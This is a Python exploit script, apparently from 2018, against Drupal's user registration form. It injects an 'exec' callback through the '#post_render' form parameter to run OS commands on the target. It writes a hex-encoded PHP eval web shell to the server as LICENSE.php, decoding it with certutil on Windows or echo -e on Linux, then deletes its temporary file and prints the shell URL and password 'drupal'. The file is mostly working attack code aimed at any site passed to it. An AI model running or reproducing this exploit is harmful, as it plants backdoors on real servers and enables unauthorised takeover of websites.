#!/usr/bin/dev python
# -*- coding:utf-8 -*-
# author: Lion Ei'Jonson
# date:2018/05/14

import sys
import requests

def useage():
	print("[*]Useage: python %s http://wwww.lioneijonson.cn" % sys.argv[0])

def remoteExcute(url, payload):
	data = {'mail[#post_render][]':'exec', 'mail[#children]':payload,'form_id':'user_register_form'}
	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded'} 
	content = requests.post(url, headers=headers, data=data)

def check_file(route):
	response = requests.get(route)
	if response.status_code == 200:
		return True
	else:
		return False

def shell_information(site):
	print("[*]Target is vulnerable")
	print("[*]shell:%s/LICENSE.php" % site)
	print("[*]password:drupal")


if __name__ == '__main__':
	if len(sys.argv) != 2:
		useage()
		sys.exit()
	if(sys.argv[1][:4]) != "http":
		site = "http://" + sys.argv[1]
	else:
		site = sys.argv[1]
	url = site + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
	upload_file_payload = "echo 3c 3f 70 68 70 20 65 76 61 6c 28 24 5f 50 4f 53 54 5b 27 64 72 75 70 61 6c 27 5d 29 3b 20 3f 3e>>conf1g.txt"
	upload_file_route = site + "/conf1g.txt"
	unhexcode_file_payload_windows = "certutil.exe -decodehex conf1g.txt LICENSE.php"
	unhexcode_file_payload_linux = "echo -e '\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x27\x64\x72\x75\x70\x61\x6c\x27\x5d\x29\x3b\x20\x3f\x3e' >> LICENSE.php"
	unhexcode_file_route = site + "/LICENSE.php"
	remove_text_payload = "del conf1g.txt"
	try:
		remoteExcute(url, upload_file_payload)
	except:
		print("[!]The target can't connection")
		sys.exit()
	if not check_file(upload_file_route):
		print("[!]The target is not vulnerable")
		sys.exit()
	try:
		remoteExcute(url, unhexcode_file_payload_windows)
		remoteExcute(url, remove_text_payload)
		if check_file(unhexcode_file_route):
			shell_information(site)
		else:
			remoteExcute(url, unhexcode_file_payload_linux)
			if check_file(unhexcode_file_route):
				shell_information(site)
			else:
				print("[!]The target is vulnerable,but this poc can't upload shell.")
				sys.exit()			

	except:
		print("[!]The target is vulnerable,but this poc can't upload shell.")
		sys.exit()
